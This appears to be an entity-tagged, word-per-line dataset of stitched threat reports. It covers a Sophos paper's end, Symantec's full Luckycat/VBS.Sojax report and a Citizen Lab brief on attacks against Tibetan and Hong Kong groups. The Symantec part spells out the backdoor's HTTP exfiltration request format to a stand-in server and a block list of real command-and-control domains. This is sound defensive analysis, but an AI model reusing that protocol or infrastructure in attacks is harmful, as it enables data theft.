Data\Erease.vbe
,
that
connects
to
the
C&C
server
.

The
dropped
decoy
document
is
bogus
,
a
truncated
copy
of
the
exploited
document
.

C&C
servers
:
www.freetimes.dns05.com B_url.normal
Dynamic
DNS
service
19
A
SophosLabs
technical
paper
–
October
2014
The
Rotten
Tomato
Campaign
Conclusion
Apart
from
the
lesson
learned
about
malware
development
,
what
can
we
learn
from
this
process
?

The
partially
successful
Plugx B_malware.backdoor
attempt
raises
a
few
questions
.

Should
it
be
considered
as
a
common
cybercrime
sample
(
as
the
dropped
Zbot B_malware.infosteal
suggests
)
or
as
an
APT
(
as
Plugx B_malware.backdoor
does
)
?

Actually
,
it
depends
on
the
patch
level
of
the
targeted
computer
.

The
narrow
line
between
APT
and
common
malware
shrank
to
zero
with
that
sample
.

We
have
seen
earlier6
that
authors
of
common
malware
are
getting
the
idea
of
document-based
exploitation
from
the
APT
players
.

Now
it
is
swinging
back
–
targeted
attack
players
are
snatching
ideas
from
the
other
group
.

The
fact
that
the
attempt
was
less
successful
does
not
deny
the
fact
that
a
symbiosis
exists
between
the
two
distinct
criminal
groups
,
and
ideas
are
floating
in
both
directions
.

References
:
1
.

http://blog.malwaretracker.com/2013/06/tomato-garden-campaign-part-2-old-new.html B_url.normal
2
.

http://www.securelist.com/en/analysis/204792298/The_curious_case_of_a_CVE_2012_0158_exploit B_url.normal
3
.

https://www.virustotal.com/en-gb/file/3ba00f684daf0f9f2c1bef0934f1af73c7dabd44a13070b64de34c0754110aa3/analysis/ B_url.normal
4
.

https://nakedsecurity.sophos.com/2014/06/30/from-the-labs-Plugx-the-next-generation/ B_url.normal
5
.

http://blog.9bplus.com/watching-attackers-through-virustotal/ B_url.normal
6
.

https://nakedsecurity.sophos.com/2014/03/11/on-the-trail-of-advanced-persistent-threats/ B_url.normal
7
.

http://www.arcticadv.com/free/ebook/pdf/sdb-explorer-exe-black-hat.html B_url.normal
8
.

http://www.fireeye.com/blog/technical/malware-research/2013/08/the-curious-case-of-encoded-vb-scripts-apt-nineblog.html B_url.normal

Oxford
,
UK
|
Boston
,
USA©
Copyright
2014
.

Sophos
Ltd
.

All
rights
reserved.Registered
in
England
and
Wales
No
.

2096520
,
The
Pentagon
,
Abingdon
Science
Park
,
Abingdon
,
OX14
3YP
,
UKSophos
is
the
registered
trademark
of
Sophos
Ltd
.

All
other
product
and
company
names
mentioned
are
trademarks
or
registered
trademarks
of
their
respective
owners.10.14RG.tpna.simpleUnited
Kingdom
and
Worldwide
SalesTel
:
+44
(
0
)
8447
671131Email
:
sales@sophos.comNorth
American
SalesToll
Free
:
1-866-866-2802Email
:
nasales@sophos.comAustralia
and
New
Zealand
SalesTel
:
+61
2
9409
9100Email
:
sales@sophos.com.auAsia
SalesTel
:
+65
62244168Email
:
salesasia@sophos.com
Contents
Overview
............................................................
1
Technical
details
................................................
2
Attack
vector
................................................
2
VBS.Sojax B_malware.backdoor
.....................................................
3
C&C
server
protocol
.....................................
4
Victims
..........................................................
5
The
attackers
...............................................
5
Conclusion..........................................................
6
Symantec
protection
.........................................
7
Appendix
............................................................
8
Recommendations
.......................................
8
MD5s
of
VBS.Sojax B_malware.backdoor
samples
........................
9
Infographic
.................................................
10

The
Luckycat B_malware.drop
Hackers

Overview

A
series
of
attacks
,
targeting
both
Indian
military
research
and
south
Asian
shipping
organizations
,
demonstrate
the
minimum
level
of
effort
required
to
successfully
compromise
a
target
and
steal
sensitive
information
.

The
attackers
use
very
simple
malware
,
which
required
little
development
time
or
skills
,
in
conjunction
with
freely
available
Web
hosting
,
to
implement
a
highly
effective
attack
.

It
is
a
case
of
the
attackers
obtaining
a
maximum
return
on
their
investment
.

The
attack
shows
how
an
intelligent
attacker
does
not
need
to
be
particularly
technically
skilled
in
order
to
steal
the
information
they
are
after
.

The
attack
begins
,
as
is
often
the
case
,
with
an
email
sent
to
the
victim
.

A
malicious
document
is
attached
to
the
email
,
which
,
when
loaded
,
activates
the
malware
.

The
attackers
use
tailored
emails
to
encourage
the
victim
to
open
the
email
.

For
example
,
one
email
sent
to
an
academic
claimed
to
be
a
call
for
papers
for
a
conference
(
CFP
)
.

Academics
receive
dozens
of
CFPs
every
year
.

If
the
victim
has
previously
presented
at
that
particular
conference
,
or
is
interested
in
the
subject
matter
,
they
are
quite
likely
to
open
the
CFP
.

Another
email
sent
to
a
maritime
organization
claims
to
contain
details
of
an
alert
beaconing
system
.

Again
,
this
is
a
relevant
topic
for
the
recipient
.

A
judicious
choice
of
email
topics
and
recipients
by
the
attackers
is
the
most
effective
way
of
compromising
the
target
and
also
maintaining
a
low
profile
.

Fewer
,
more
effective
emails
,
which
do
not
draw
attention
to
themselves
,
allow
the
attacks
to
continue
undetected
for
as
long
as
possible
.

Discreet
malware
also
aids
this
cause
.

After
the
email
attachment
has
been
opened
by
the
victim
,
the
malware
,
VBS.Sojax B_malware.backdoor
,
is
activated
.

The
attackers
chose
a
very
simple
technique
for
Security
Response
The
Luckycat B_malware.drop
Hackers
their
malware
.

Rather
than
using
a
compiled
programming
language
to
write
the
back
door
Trojan
,
they
used
a
Visual
Basic
script
.

Scripts
are
very
simple
to
develop
,
requiring
less
expertise
and
time
to
develop
than
a
standard
back
door
Trojan
.

The
script
itself
is
quite
simple
.

It
connects
to
a
command-and-control
(
C&C
)
server
to
retrieve
commands
and
upload
data
.

HTTP
is
used
to
easily
pass
through
firewalls
.

The
script
functionality
is
basic
;
it
can
run
commands
and
it
can
upload
and
download
files
.

This
is
enough
to
retrieve
any
information
the
attackers
want
.

Again
,
minimal
effort
is
expended
for
maximum
gain
.

The
same
ethos
is
shown
with
the
choice
of
C&C
servers
.

C&C
servers
are
a
potential
pitfall
for
the
attackers
as
it
may
be
possible
for
an
investigator
to
track
the
attackers
using
registration
details
for
the
C&C
server
.

This
is
the
case
when
the
attackers
register
and
pay
for
their
own
C&C
server
.

A
commonly
used
alternative
is
for
attackers
to
commandeer
an
innocent
third
party
server
for
their
own
purposes
.

This
requires
effort
,
however
,
as
the
attackers
must
firstly
locate
and
then
hack
into
the
server
.

The
Sojax B_malware.backdoor
attackers
use
an
approach
that
requires
much
less
effort
.

They
use
free
Web
hosting
.

There
are
hundreds
of
free
Web
hosting
sites
that
require
little
or
no
registration
information
.

Once
the
attackers
have
registered
the
free
service
,
they
create
a
directory
and
upload
a
PHP
script
that
acts
as
the
C&C
server
.

They
then
modify
their
malware
scripts
to
use
this
new
URL
and
email
the
scripts
out
to
targets
.

Symantec
identified
25
C&C
servers
.

Only
two
or
three
of
these
were
active
,
the
rest
had
been
abandoned
.

Several
partial
listings
of
stolen
file
names
(
not
the
files
)
were
retrieved
from
the
server
,
along
with
the
IP
addresses
of
compromised
computers
and
the
IP
addresses
of
the
attackers
.

The
vast
majority
of
the
victims
were
based
in
India
,
with
some
in
Malaysia
.

The
victim
industry
was
mostly
military
research
and
also
shipping
based
in
the
Arabian
and
South
China
seas
.

In
some
instances
the
attackers
appeared
to
have
a
clear
goal
,
whereby
specific
files
were
retrieved
from
certain
compromised
computers
.

In
other
cases
,
the
attackers
used
more
of
a
'shotgun
'
like
approach
,
copying
every
file
from
a
computer
.

Military
technologies
were
obviously
the
focus
of
one
particular
attack
with
what
appeared
to
be
source
code
stolen
.

45
different
attacker
IP
addresses
were
observed
.

Out
of
those
,
43
were
within
the
same
IP
address
range
based
in
Sichuan
province
,
China
.

The
remaining
two
were
based
in
South
Korea
.

The
pattern
of
attacker
connections
implies
that
the
IP
addresses
are
being
used
as
a
VPN
,
probably
in
an
attempt
to
render
the
attackers
anonymous
.

The
attacks
have
been
active
from
at
least
April
2011
up
to
February
2012
.

The
attackers
are
intelligent
and
focused
,
employing
the
minimum
amount
of
work
necessary
for
the
maximum
gain
.

They
do
not
use
zero
day
exploits
or
complicated
threats
,
instead
they
rely
on
effective
social
engineering
and
lax
security
measures
on
the
part
of
the
victims
.

Security
awareness
training
and
a
consistent
patching
strategy
would
have
protected
the
victims
from
these
attacks
.

Figure
1
Example
emails
Technical
details
Attack
vector
The
attacks
are
initiated
by
email
.

Symantec.cloud
has
detected
several
emails
distributing
the
VBS.Sojax B_malware.backdoor
back
door
Trojan
.

Two
example
emails
are
shown
in
figure
1
.

Most
of
the
emails
are
fairly
well
tailored
.

The
two
examples
shown
here
are
probably
the
most
targeted
ones
.

Other
emails
topics
are
about
salaries
–
a
fairly
common
topic
used
in
targeted
attacks
.

The
emails
are
nearly
all
sent
from
Gmail
,
which
does
not
store
the
originating
IP
address
.

Two
of
the
emails
were
Page
2
Security
Response
sent
through
Yahoo
mail
,
which
does
store
the
originating
IP
address
.

The
source
IP
address
for
both
of
these
emails
was
the
same
–
an
IP
address
located
in
Germany
.

Other
independent
reports
show
this
IP
address
as
an
originator
of
spam
and
thus
may
be
an
open
relay
.

The
breakdown
of
emails
detected
by
Symantec.cloud
and
samples
per
month
is
shown
in
figure
2
.

These
numbers
represent
the
minimum
number
of
emails
sent
by
the
attackers
as
not
all
victims
are
using
Symantec.cloud
services
.

Figure
3
lists
the
number
and
type
of
exploit
used
by
the
attackers
.

The
exploits
are
all
old
,
publicly
available
,
and
patched
.

The
vast
majority
used
are
PDF
exploits
.

Sixteen
samples
exploiting
the
CVE-2010-2883
vulnerability
have
been
located
,
with
only
one
or
two
of
the
other
exploits
.

It
may
be
that
the
attackers
have
more
success
with
the
PDF
exploit
either
because
the
target
computers
are
not
patched
,
or
because
it
is
easier
to
obfuscate
the
PDFs
and
prevent
antivirus
detection
.

VBS.Sojax B_malware.backdoor
When
the
dropper
document
,
the
.doc
,
.rtf
,
or
.pdf
is
loaded
,
it
drops
an
executable
to
the
following
location
:
%
ProgramFiles
%
\Common
Files\Microsoft
Shared\update.exe
The
Luckycat B_malware.drop
Hackers
Figure
2
Samples
&
emails
over
time
Figure
3
Exploits
used
by
the
attackers
Figure
4
A
portion
of
VBS.Sojax B_malware.backdoor
This
executable
is
then
run
.

When
run
,
it
extracts
a
script
from
its
resources
and
writes
this
script
to
the
following
location
%
Temp%\~temp.vbs
.

This
script
contains
the
primary
functionality
of
the
threat
.

Figure
4
shows
a
portion
of
the
script
.

The
simplicity
of
the
script
is
plain
to
see
.

When
first
run
,
the
script
obtains
the
following
information
:
•
A
complete
listing
of
all
files
in
partitions
from
drives
C
through
I
•
Network
information
(
ipconfig
/all
)
•
Information
about
the
compromised
computer
(
systeminfo
)
•
Processes
running
on
the
computer
(
tasklist
)
It
stores
all
of
the
output
in
the
following
folder
:
%
Windir
%
\NtUninstallKB
This
data
is
then
compressed
into
a
.cab
file
and
uploaded
to
the
C&C
server
.

VBS.Sojax B_malware.backdoor
parses
the
response
from
the
server
,
looking
for
three
potential
commands
:
•
Upload
files
to
the
C&C
server
•
Download
files
from
the
C&C
server
•
Execute
a
command
(
figure
4
)
Page
3
Security
Response
The
Luckycat B_malware.drop
Hackers
The
C&C
server
is
then
polled
every
30
seconds
for
additional
commands
.

To
maintain
persistence
,
VBS.Sojax B_malware.backdoor
registers
itself
to
be
called
on
reboot
using
a
WMI
event
.

C&C
server
protocol
When
VBS.Sojax B_malware.backdoor
connects
to
the
C&C
server
,
it
does
so
through
HTTP
port
80
.

If
uploading
data
,
it
sends
a
HTTP
POST
request
to
a
script
called
either
count.php
or
loveusa.php
.

This
POST
request
is
formatted
as
follows
:
HTTP
POST
http://server.com/count/count.php?m=c&n=MACADDRESS
The
MACADDRESS
value
is
the
MAC
address
of
the
compromised
computer
.

To
retrieve
a
command
from
the
server
,
the
script
then
polls
for
commands
specific
to
that
MACADDRESS
.

HTTP
GET
http://server.com/count/count.php?m=r&n=MACADDRESS.c
If
there
is
a
command
,
the
command
is
executed
and
the
results
are
uploaded
to
the
server
using
a
HTTP
POST
request
.

It
is
a
very
simple
protocol
,
there
is
no
authentication
.

C&C
servers
So
far
,
25
C&C
servers
have
been
identified
.

They
are
listed
in
Table
1
and
graphed
in
figure
5
.

The
majority
of
these
C&C
servers
are
free
hosting
providers
.

The
attackers
sign
up
for
an
account
,
register
the
sub-domain
for
free
,
and
upload
their
C&C
server
script
to
a
count
folder
.

Table
1
When
a
compromised
computer
uploads
data
to
the
count.php
script
using
an
HTTP
post
,
that
data
is
written
into
a
file
in
the
same
folder
as
the
C&C
server
.

Although
most
of
these
files
had
since
been
retrieved
and
subsequently
deleted
by
the
attackers
,
several
files
remained
.

Some
of
the
remaining
files
were
the
compressed
.cab
files
described
previously
.

Others
were
fragments
of
commands
and
some
stolen
files
.

In
one
instance
,
several
log
files
of
activity
on
a
C&C
server
were
found
.

These
log
files
listed
all
of
the
files
stolen
by
the
attackers
with
respect
to
that
particular
C&C
server
.

There
was
also
a
log
file
showing
what
appeared
to
be
FTP
connections
to
the
server
from
the
attackers
.

Figure
5
Distribution
of
C&C
servers
Command
and
Control
domains
C&C
Server
Domains
2012enviroment.world.mu
charlesbrain.shop.co
clbest.greenglassint.net
dasauto.no-sports.de
footballshopping.shop.co
frankwhales.shop.co
jeepvihecle.shop.co
killmannets.0fees.net
lampaur.b2b.cm
lovesea-blog.co.de
lucysmith.0fees.net
maritimemaster.kilu.org
sawakastocks.tv4.org
shoesshopping.shop.co
shoppingfans.shop.co
skirtdressing.shop.co
toms.0fees.net
tomsburs.shop.co
vpoasport.shopping2000.com
womems.in.nf
www.fireequipment.website.org
www.goodwell.all.co.uk
www.lo[REMOVED]et.com
www.pumasports.website.org
Page
4
Security
Response
The
Luckycat B_malware.drop
Hackers
Victims
From
the
log
files
and
fragments
of
stolen
data
remaining
on
the
server
,
it
was
possible
to
identify
eight
victims
.

At
the
time
of
writing
,
where
possible
,
the
victims
are
in
the
process
of
being
notified
and
any
information
retrieved
passed
on
.

Figure
6
shows
the
geographical
distribution
of
the
victims
.

Nearly
every
infection
is
in
India
,
with
several
others
in
Malaysia
.

Figure
6
Distribution
of
VBS.Sojax B_malware.backdoor
victims
Victim
industries
were
military
research
,
defense
,
manufacturing
,
and
maritime
.

The
data
stolen
was
quite
varied
.

In
some
cases
it
appeared
that
documents
with
suggestive
names
were
stolen
,
simply
out
of
curiosity
.

For
example
,
one
stolen
document
that
had
a
military
themed
title
is
actually
publicly
available
from
the
publisher
's
website
.

Other
stolen
files
were
more
serious
.

Two
separate
victims
had
documents
pertaining
to
the
same
military
technology
.

The
attackers
were
clearly
targeting
that
technology
.

The
attackers
also
stole
source
code
from
one
of
those
two
victims
that
may
have
been
related
to
the
technology
.

The
attackers
The
most
useful
information
about
the
attackers
is
in
one
of
the
log
files
retrieved
from
a
C&C
server
.

This
log
file
appears
to
record
connections
to
an
FTP
server
running
on
the
C&C
server
.

The
attackers
probably
use
FTP
to
easily
retrieve
stolen
data
uploaded
to
the
C&C
server
.

45
unique
IP
addresses
were
identified
in
the
log
.

Of
these
,
all
but
two
are
from
the
same
ISP
,
based
in
Sichuan
province
in
China
.

The
remaining
two
are
from
South
Korea
.

Figure
7
shows
a
portion
of
that
log
.

Figure
7
Connections
from
the
attacker
The
user
Luckycat B_malware.drop
is
the
attacker
who
successfully
logged
into
the
server
.

The
connections
by
Luckycat B_malware.drop
are
consecutive
.

Immediately
after
one
connection
is
closed
,
a
new
one
is
opened
by
the
attacker
.

A
lack
of
overlap
implies
that
a
single
person
or
program
is
making
the
connections
and
not
multiple
people
from
different
computers
.

Page
5

Security
Response
The
Luckycat B_malware.drop
Hackers
Despite
this
,
the
IP
address
used
for
the
new
connection
changes
regularly
.

In
figure
7
,
during
a
period
of
approximately
an
hour
and
15
minutes
,
four
different
IP
addresses
were
used
for
six
distinct
connections
.

This
is
unusual
because
if
the
attacker
is
using
DHCP
,
generally
an
IP
address
will
remain
allocated
to
a
particular
computer
for
a
longer
period
of
time
.

A
possible
explanation
is
that
the
IP
addresses
used
are
the
point
of
egress
of
a
VPN-like
service
.

The
attackers
may
be
using
a
service
through
which
they
can
route
their
connections
.

The
service
periodically
rotates
connections
amongst
a
pool
of
IP
addresses
in
order
to
render
the
attacker
anonymous
or
implicate
China
as
the
source
of
the
attack
.

There
are
two
potential
reasons
for
the
South
Korean
IP
addresses
.

The
first
is
that
the
IP
addresses
are
part
of
the
VPN
service
and
were
assigned
to
the
attacker
as
the
service
rotated
through
the
range
of
IP
addresses
available
.

The
second
explanation
is
that
the
attacker
may
have
forgotten
to
enable
the
VPN
by
mistake
and
connected
directly
to
the
C&C
server
.

Figures
8
and
9
show
the
log
at
the
time
that
the
South
Korean
IP
addresses
logged
into
the
FTP
server
.

Figure
8
First
South
Korean
IP
address
Figure
9
Second
South
Korean
IP
address
In
both
cases
,
connections
from
the
Chinese
and
South
Korean
IP
addresses
are
around
the
same
time
.

Either
the
time
overlaps
as
in
figure
8
,
or
the
times
are
immediately
consecutive
as
in
figure
9
.

This
suggests
that
the
connecting
person
,
or
program
,
is
the
same
in
both
cases
.

Conclusion

The
attacks
described
are
very
simple
.

That
,
however
,
does
not
mean
that
they
are
not
intelligently
designed
and
ultimately
,
highly
effective
.

Using
a
scripting
language
to
develop
the
VBS.Sojax B_malware.backdoor
threat
cuts
down
on
development
time
.

It
means
less
effort
needs
to
be
invested
in
attempting
to
prevent
detection
by
antivirus
software
.

Similarly
,
using
freely
available
hosting
for
C&C
servers
(
theoretically
)
limits
exposure
.

Old
exploits
are
so
well
documented
and
freely
available
that
minimal
effort
is
required
to
modify
them
for
use
.

Such
basic
tools
,
in
combination
with
targeted
social
engineering
,
proved
to
be
an
efficient
combination
for
the
attacker
.

These
attacks
should
not
have
succeeded
on
a
properly
secured
network
.

Old
exploits
should
have
been
patched
and
users
should
have
received
adequate
security
awareness
training
.

Page
6
Security
Response
The
Luckycat B_malware.drop
Hackers
Symantec
protection
Many
different
Symantec
protection
technologies
play
a
role
in
defending
against
this
threat
,
including
:
File-based
protection
(
traditional
antivirus
)
Traditional
antivirus
protection
is
designed
to
detect
and
block
malicious
files
and
is
effective
against
files
associated
with
this
attack
.

•
VBS.Sojax B_malware.backdoor
•
VBS.Sojax!gen1 B_malware.backdoor
•
Trojan.Pidief B_malware.backdoor
•
Bloodhound.Exploit.290 B_malware.backdoor
•
Bloodhound.Exploit.357 B_malware.backdoor
•
Bloodhound.Exploit.422 B_malware.backdoor

Network-based
protection
(
IPS
)
Network
based
protection
can
help
protect
against
unauthorized
network
activities
conducted
by
malware
threats
or
intrusion
attempts
.

•
Web
Attack
:
HTTP
Adobe
Acrobat
CVE-2010-0188
2
•
Web
Attack
:
Adobe
Flash
Embedded
SWF
CVE-2011-0611
•
Attack
:
Adobe
Reader
TTF
File
CVE-2010-2883
•
Attack
:
MS
Office
Word
RTF
Exploit
CVE-2010-3333
•
HTTP
MS
Office
Word
RTF
RCE
1
Behavior-based
protection
Symantec
products
with
behavior-based
detection
technology
can
detect
and
block
previously
unknown
threats
from
executing
,
including
those
associated
with
this
attack
.

Files
detected
by
this
technology
will
be
reported
as
Bloodhound.Sonar.9
.

Reputation-based
protection
(
Insight
)
Symantec
Download
Insight
can
proactively
detect
and
block
files
associated
with
this
attack
using
Symantec
's
extensive
file
reputation
database
.

Files
detected
by
this
technology
will
be
reported
as
WS.Reputation.1
.

Email-based
protection
The
Skeptic
heuristic
engine
in
Symantec
MessageLabs
Email
Security.cloud
can
detect
and
block
emails
that
are
associated
with
this
attack
.

Other
protection
Application
and
Device
Control
—
Symantec
Endpoint
Protection
users
can
enable
this
feature
to
detect
and
block
potentially
malicious
files
from
executing
.

Page
7
Security
Response
The
Luckycat B_malware.drop
Hackers
Appendix
Recommendations
Update
antivirus
definitions
Ensure
that
your
antivirus
software
has
up-to-date
antivirus
definitions
and
ensure
that
your
product
has
the
auto-protect
feature
enabled
.

You
can
obtain
the
latest
definitions
through
LiveUpdate
or
download
the
latest
definitions
from
our
website
.

Apply
patches
for
the
following
vulnerabilities
Symantec
recommends
that
users
apply
patches
for
the
following
vulnerabilities
to
help
protect
against
this
and
similar
attacks
:
•
Adobe
Reader
'CoolType.dll
'
TTF
Font
Remote
Code
Execution
Vulnerability
(
BID
43057/
CVE-2010-2883
)
•
Adobe
Flash
Player
CVE-2011-0611
'SWF
'
File
Remote
Memory
Corruption
Vulnerability
(
BID
47314/CVE-2011-0611
)
•
Microsoft
Office
RTF
File
Stack
Buffer
Overflow
Vulnerability
(
BID
44652/
CVE-2010-3333
)
•
Adobe
Acrobat
and
Reader
CVE-2010-0188
Remote
Code
Execution
Vulnerability
(
BID
38195/
CVE-2010-0188
)
Prevent
back
door
communications
Block
access
to
the
following
command-and-control
server
domains
that
are
associated
with
this
attack
.

•
2012enviroment.world.mu B_url.cncsvr
•
charlesbrain.shop.co B_url.cncsvr
•
clbest.greenglassint.net B_url.cncsvr
•
dasauto.no-sports.de B_url.cncsvr
•
footballshopping.shop.co B_url.cncsvr
•
frankwhales.shop.co B_url.cncsvr
•
jeepvihecle.shop.co B_url.cncsvr
•
killmannets.0fees.net B_url.cncsvr
•
lampaur.b2b.cm B_url.cncsvr
•
lovesea-blog.co.de B_url.cncsvr
•
lucysmith.0fees.net B_url.cncsvr
•
maritimemaster.kilu.org B_url.cncsvr
•
sawakastocks.tv4.org B_url.cncsvr
•
shoesshopping.shop.co B_url.cncsvr
•
shoppingfans.shop.co B_url.cncsvr
•
skirtdressing.shop.co B_url.cncsvr
•
toms.0fees.net B_url.cncsvr
•
tomsburs.shop.co B_url.cncsvr
•
vpoasport.shopping2000.com B_url.cncsvr
•
womems.in.nf B_url.cncsvr
•
www.fireequipment.website.org B_url.cncsvr
•
www.goodwell.all.co.uk B_url.cncsvr
•
www.pumasports.website.org B_url.cncsvr

Page
8

Security
Response
MD5s
of
VBS.Sojax B_malware.backdoor
samples
0x2924339C60D4905AFDAD6664F859DE2C B_hash
0x324B98DE1F86ADE0817DA0FF4C5A38BA B_hash
0x40DDB1D8C2F000661AA3031A6FCFA156 B_hash
0x4844982A4B4863505FAFAF8B52A4DC97 B_hash
0x70EDAAA835D0861BE0F675E7A6EB2CDA B_hash
0xA7109C03B002CBCC0ADAB73AEA2C9797 B_hash
0xBEE3C1910319BB5A4D39BCFBF2A30220 B_hash
0xE04E5EB4AEFEB326246D7F41D1B50759 B_hash
0xE542372D7368AF162D0B8540271B43D5 B_hash
0xF174E308C86F09336660E2991E47732A B_hash
0xFE9DB18A3FDABB6A37E8FE436820BBFB B_hash
0xFF03CFB24083B2EC00684E1CB2BCC8F1 B_hash

The
Luckycat B_malware.drop
Hackers

Page
9

Security
Response
Infographic
SYMANTEC
SECURITY
RESPONSE
QUICK
FACT
SHEET
1
.

Incursion
Uses
targeted
email
-
Attachments
:
.DOC
.RTF
.PDF
Uses
vulnerabilities
-
CVE-2010-2883
-
CVE-2011-0611
-
CVE-2010-3333
-
CVE-2010-0188
Targeted
Countries
:
-
India
-
Malaysia
Industry
sector
(
s
)
:
-
Defense
-
Academic
-
Research
-
Manufacturing
VBS.Sojax B_malware.backdoor
Trojan
dropped
by
targeted
email
'Simple
but
effective
'
-
HTTP
Back
door
-
3
Commands
-
Run
command
-
Download
-
Upload
'
Luckycat B_malware.drop
'
Hackers
Apr
2011
–
Feb
2012
2
.

Discovery
Initial
stolen
info
:
-
Directory
listings
-
Network
info
-
System
info
-
Processes
Stolen
info
uploaded
to
C&C
server
,
then
awaits
further
instructions
3
.

Capture
Information
sought
:
-
'Interesting
'
docs
-
Source
code
-
Military
info
-
Technological
info
4
.

Exfiltration
C&C
server
facts
:
-Uses
'free
hosting
'
services
&
PHP
scripts
-
Polled
every
30
sec
-
Uses
HTTP
C&C
server
countries
:
-
Germany
-
USA
-
UK
Attacker
IPs
-
China
(
42
)
-
South
Korea
(
2
)
Copyright
©
Symantec
Corporation
2012
The
Luckycat B_malware.drop
Hackers
MARCH
2012
A
.

Protection

Antivirus
-
VBS.Sojax B_malware.backdoor
-
VBS.Sojax!gen1
-
Trojan.Pidief
-
Bloodhound.Exploit.290
-
Bloodhound.Exploit.357
-
Bloodhound.Exploit.422

SONAR

Symantec
Insight

IPS

.Cloud
Services
B
.

Mitigation
Update
software
:
-
MS
Office
-
Adobe
Acrobat
-
Adobe
Reader
-
Adobe
Flash
C.
More
Info
VBS.Sojax B_malware.backdoor
bit.ly/waZFhf
Whitepaper
bit.ly/ypnsNs
Page
10
Security
Response
The
Luckycat B_malware.drop
Hackers
Page
11
Security
Response
Any
technical
information
that
is
made
available
by
Symantec
Corporation
is
the
copyrighted
work
of
Symantec
Corporation
and
is
owned
by
Symantec
Corporation
.

NO
WARRANTY . The
technical
information
is
being
delivered
to
you
as
is
and
Symantec
Corporation
makes
no
warranty
as
to
its
accuracy
or
use
.

Any
use
of
the
technical
documentation
or
the
information
contained
herein
is
at
the
risk
of
the
user
.

Documentation
may
include
technical
or
other
inaccuracies
or
typographical
errors
.

Symantec
reserves
the
right
to
make
changes
without
prior
notice
.

About
Symantec
Symantec
is
a
global
leader
in
providing
security
,
storage
and
systems
management
solutions
to
help
businesses
and
consumers
secure
and
manage
their
information
.

Headquartered
in
Mountain
View
,
Calif.
,
Symantec
has
operations
in
more
than
40
countries
.

More
information
is
available
at
www.symantec.com B_url.normal
.

Copyright
©
2012
Symantec
Corporation
.

All
rights
reserved
.

Symantec
and
the
Symantec
logo
are
trademarks
or
registered
trademarks
of
Symantec
Corporation
or
its
affiliates
in
the
U.S.
and
other
countries
.

Other
names
may
be
trademarks
of
their
respective
owners
.

For
specific
country
offices
and
contact
numbers
,
please
visit
our
Web
site
.

For
product
information
in
the
U.S.
,
call
toll-free
1
(
800
)
745
6054
.

Symantec
Corporation
World
Headquarters
350
Ellis
Street
Mountain
View
,
CA
94043
USA
+1
(
650
)
527-8000
www.symantec.com B_url.normal
Security
Response
The
Citizen
Lab

Research
Brief
June
2015

Target
Attacks
against
Tibetan
and
Hong
Kong
Groups
Exploiting
CVE-2014-4114

Authors
:
Katie
Kleemola
,
Masashi
Crete-Nishihata
,
and
John
Scott-Railton

INTRODUCTION

This
post
analyzes
targeted
malware
attacks
against
groups
in
the
Tibetan
diaspora
and
pro-democracy
groups
in
Hong
Kong
.

All
of
these
attacks
leveraged
CVE-2014-4114
and
were
delivered
via
malicious
Microsoft
PowerPoint
Slideshow
files
(
*.pps
)
.

These
attacks
are
highly
targeted
,
appear
to
re-purpose
legitimate
content
in
decoy
documents
,
and
had
very
low
antivirus
(
AV
)
detection
rates
at
the
time
they
were
deployed
.

The
attacks
against
Tibetan
groups
shows
a
change
in
tactics
from
previous
campaigns
.

Over
the
past
four
years
the
majority
of
attacks
we
have
seen
against
Tibetan
groups
use
CVE-2010-3333
or
CVE-2012-0158
.

The
use
of
CVE-2014-4114
marks
the
first
time
we
have
observed
a
change
from
this
pattern
in
the
last
two
years
.

One
attack
sent
to
Tibetan
groups
used
a
link
to
a
file
on
Google
Drive
to
deliver
the
malware
.

Groups
in
the
Tibetan
community
have
promoted
awareness
campaigns
around
e-mail
attachments
,
which
have
been
the
most
common
attack
vector
for
the
community
.

This
campaign
,
'Detach
from
Attachments
,
'
urges
users
to
avoid
sending
or
opening
email
attachments
,
and
to
use
cloud-based
storage
to
send
files
like
Google
Drive
as
an
alternative
.

The
use
of
Google
Drive
to
send
malware
may
be
evidence
of
attackers
adapting
to
the
behavioral
countermeasures
promoted
by
the
campaign
.

In
addition
to
the
use
of
the
same
CVE
,
some
of
the
attacks
targeting
Tibetan
rights
groups
and
Hong
Kong
groups
have
overlap
in
malware
family
(
PlugX
)
and
Command
and
Control
(
C2
)
domains
.

The
similarities
between
these
attacks
suggests
that
either
they
are
being
conducted
by
the
same
threat
actor
or
threat
actors
targeting
these
groups
are
sharing
tactics
,
tools
,
and
procedures
(
TTPs
)
.

Targeting
and
Social
Engineering

We
observed
a
total
of
five
malware
campaigns
that
used
CVE-2014-4114
and
a
range
of
social
engineering
tactics
to
persuade
recipients
to
either
open
an
attachment
,
or
visit
a
URL
and
download
a
malicious
file
.

In
all
of
these
attacks
,
if
a
recipient
double
clicks
on
the
.pps
file
,
they
are
shown
decoy
content
.

Examination
of

the
exif
metadata
of
the
files
indicates
that
the
attackers
are
likely
repurposing
material
from
legitimate
presentations
.

PPT
files
(
the
more
commonly
used
PowerPoint
file
extension
)
are
automatically
opened
in
edit
mode
,
whereas
.pps
files
are
automatically
opened
in
slideshow
mode
.

For
the
CVE-2014-4114
exploit
to
work
,
the
Powerpoint
Slideshow
needs
to
be
played
.

Sending
.pps
files
that
automatically
run
a
PowerPoint
Slideshow
is
likely
an
attempt
by
the
attackers
to
increase
the
infection
rate
.

TIBETAN
ATTACKS
Over
April
and
May
2015
we
observed
3
attack
campaigns
targeting
a
number
of
Tibetan
organizations
.

The
sophistication
of
the
social
engineering
varied
between
attacks
,
but
all
attacks
appeared
to
use
re-purposed
legitimate
content
.

Tibet
Attack
1
:
April
2015
The
first
attack
we
observed
was
sent
to
multiple
Tibetan
groups
over
the
course
of
April
2015
.

The
email
text
is
taken
from
a
website
related
to
an
advocacy
campaign
and
report
by
the
International
Tibet
Network
(
ITN
)
,
a
prominent
Tibetan
rights
group
.

The
email
signature
includes
the
real
office
address
of
ITN
.

However
,
the
sender
's
email
address
(
tibet_net@yahoo.com.hk
)
is
not
a
legitimate
address
related
to
the
group
.

Attached
to
the
email
was
a
.pps
file
that
repurposes
slides
from
a
presentation
related
to
the
same
report
and
advocacy
campaign
referenced
in
the
email
message
.


Figure
1
:
Email
lure
sent
to
Tibetan
groups

Figure
2
:
Image
from
decoy
PowerPoint
Slideshow
file

Tibet
Attack
2
:
April
28
,
2015
The
second
attack
was
sent
out
on
April
28
2015
to
multiple
Tibetan
organizations
.

The
email
message
references
a
recent
visit
between
Archbishop
Desmond
Tutu
and
His
Holiness
the
Dalai
Lama
(
HHDL
)
.

The
.pps
attachment
also
referenced
the
event
and
appears
to
be
repurposed
from
legitimate
material
.

Tibet
Attack
3
:
May
6
2015
